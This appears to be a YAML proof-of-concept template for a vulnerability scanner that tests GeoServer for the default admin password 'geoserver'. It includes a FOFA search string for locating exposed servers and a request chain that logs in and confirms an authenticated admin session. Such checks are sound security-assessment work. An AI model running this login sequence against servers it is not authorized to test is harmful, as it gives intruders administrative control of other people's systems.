id: poc-yaml-geoserver-weak-password
info:
  name: GeoServer 弱口令漏洞
  severity: high
  tags:
  - 两高一弱
  - 弱口令
  finger: geoserver
  fofa: app="GeoServer"
variables:
  user: 'admin

    geoserver

    '
firstRequest:
  method: GET
  path: /
  expression: contains(body,"geoserver")
requests:
- method: POST
  path: /geoserver/j_spring_security_check
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username={{.user}}&password=geoserver
  expression: status_code == 302 && !contains(headers,"remember-me=")
  output:
  - regex_match(headers,"JSESSIONID=(?P<cookie1>.*?);")
- method: GET
  path: /geoserver/web
  headers:
    Cookie: JSESSIONID={{.cookie1}}
  expression: status_code == 302 && contains(headers,"/geoserver/web/")
- method: GET
  path: /geoserver/web/
  headers:
    Cookie: JSESSIONID={{.cookie1}}
  expression: status_code == 302 && body == ""
  output:
  - regex_match(headers,"JSESSIONID=(?P<cookie2>.*?);")
  - regex_match(headers,"\\?(?P<path>[0-9])")
- method: GET
  path: /geoserver/web/?{{.path}}
  headers:
    Cookie: JSESSIONID={{.cookie2}}
  expression: status_code == 200 && contains(body,"Logged in as") && contains(body,"Server
    Status") && contains(body,"Strong cryptography available")
transport: http
